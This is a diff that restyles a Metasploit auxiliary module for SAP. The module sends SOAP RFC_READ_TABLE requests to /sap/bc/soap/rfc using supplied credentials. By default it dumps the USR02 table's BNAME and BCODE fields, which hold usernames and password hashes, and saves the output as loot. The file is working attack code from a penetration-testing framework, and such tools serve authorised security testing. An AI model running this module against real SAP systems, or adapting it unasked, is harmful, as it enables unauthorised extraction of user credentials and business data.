@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -25,10 +25,10 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data',
-      'Description' => %q{
+      'Description' => %q(
         This module makes use of the RFC_READ_TABLE Function to read data from tables using
         the /sap/bc/soap/rfc SOAP service.
-      },
+      ),
       'References' =>
         [
           [ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
@@ -49,12 +49,13 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('HttpPassword', [true, 'Password', '06071992']),
         OptString.new('TABLE', [true, 'Table to read', 'USR02']),
         OptString.new('FIELDS', [true, 'Fields to read', 'BNAME,BCODE'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run_host(ip)
     columns = []
-    columns << '*' if datastore['FIELDS'].nil? or datastore['FIELDS'].empty?
+    columns << '*' if datastore['FIELDS'].nil? || datastore['FIELDS'].empty?
     if datastore['FIELDS']
       columns.push(datastore['FIELDS']) if datastore['FIELDS'] =~ /^\w?/
       columns = datastore['FIELDS'].split(',') if datastore['FIELDS'] =~ /\w*,\w*/
@@ -63,10 +64,10 @@ class MetasploitModule < Msf::Auxiliary
     columns.each do |d|
       fields << "<item><FIELDNAME>" + d.gsub(/\s+/, "") + "</FIELDNAME></item>"
     end
-    exec(ip,fields)
+    exec(ip, fields)
   end
 
-  def exec(ip,fields)
+  def exec(ip, fields)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
     data << '<env:Body>'
@@ -82,23 +83,21 @@ class MetasploitModule < Msf::Auxiliary
     data << '</env:Envelope>'
     print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_READ_TABLE request")
     begin
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'ctype' => 'text/xml; charset=UTF-8',
-        'encode_params' => false,
-        'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
-        }
-      })
-      if res and res.code != 500 and res.code != 200
+      res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                             'method' => 'POST',
+                             'data' => data,
+                             'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'encode_params' => false,
+                             'headers' => {
+                               'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                             },
+                             'vars_get' => {
+                               'sap-client' => datastore['CLIENT'],
+                               'sap-language' => 'EN'
+                             })
+      if res && (res.code != 500) && (res.code != 200)
         # to do - implement error handlers for each status code, 404, 301, etc.
         if res.body =~ /<h1>Logon failed<\/h1>/
           print_error("[SAP] #{ip}:#{rport} - login failed!")
@@ -106,10 +105,10 @@ class MetasploitModule < Msf::Auxiliary
           print_error("[SAP] #{ip}:#{rport} - something went wrong!")
         end
         return
-      elsif res and res.body =~ /Exception/
+      elsif res && res.body =~ /Exception/
         response = res.body
         error = response.scan(%r{<faultstring>(.*?)</faultstring>})
-        0.upto(error.length-1) do |i|
+        0.upto(error.length - 1) do |i|
           print_error("[SAP] #{ip}:#{rport} - error #{error[i]}")
         end
         return
@@ -125,15 +124,15 @@ class MetasploitModule < Msf::Auxiliary
           'Indent' => 1,
           'Columns' => ["Returned Data"]
         )
-        0.upto(output.length-1) do |i|
+        0.upto(output.length - 1) do |i|
           saptbl << [output[i]]
         end
         print(saptbl.to_s)
         this_service = report_service(
-          :host  => ip,
-          :port => rport,
-          :name => 'sap',
-          :proto => 'tcp'
+          host: ip,
+          port: rport,
+          name: 'sap',
+          proto: 'tcp'
         )
         loot_path = store_loot("sap.tables.data", "text/plain", ip, saptbl.to_s, "#{ip}_sap_#{datastore['TABLE'].downcase}.txt", "SAP Data", this_service)
         print_good("[SAP] #{ip}:#{rport} - Data stored in #{loot_path}")
